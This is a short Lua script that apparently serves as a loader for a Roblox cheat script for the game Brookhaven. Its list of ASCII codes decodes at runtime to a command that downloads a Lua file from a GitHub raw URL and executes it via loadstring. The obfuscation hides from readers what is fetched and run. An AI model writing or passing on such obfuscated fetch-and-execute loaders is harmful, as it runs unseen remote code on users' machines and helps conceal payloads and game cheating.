--[=[ Brookhaven Loader – ASCII Obfuscated ]=]

local codes = {
    108, 111, 97, 100, 115, 116, 114, 105, 110, 103, 40, 103, 97, 109, 101, 58,
    72, 116, 116, 112, 71, 101, 116, 40, 34, 104, 116, 116, 112, 115, 58, 47,
    47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99,
    111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 105, 110, 116, 101, 108,
    50, 48, 48, 49, 53, 53, 45, 99, 112, 117, 47, 98, 114, 111, 111, 107, 104,
    97, 118, 101, 45, 115, 99, 114, 105, 112, 116, 47, 109, 97, 105, 110, 47,
    98, 114, 111, 111, 107, 104, 97, 118, 101, 110, 46, 108, 117, 97, 34, 41,
    41, 40, 41
}

local decoded = ""
for _, v in ipairs(codes) do
    decoded = decoded .. string.char(v)
end

local success, err = pcall(function()
    loadstring(decoded)()
end)

if not success then
    warn("Failed to load: " .. tostring(err))
else
    print("✅ Brookhaven script loaded.")
end
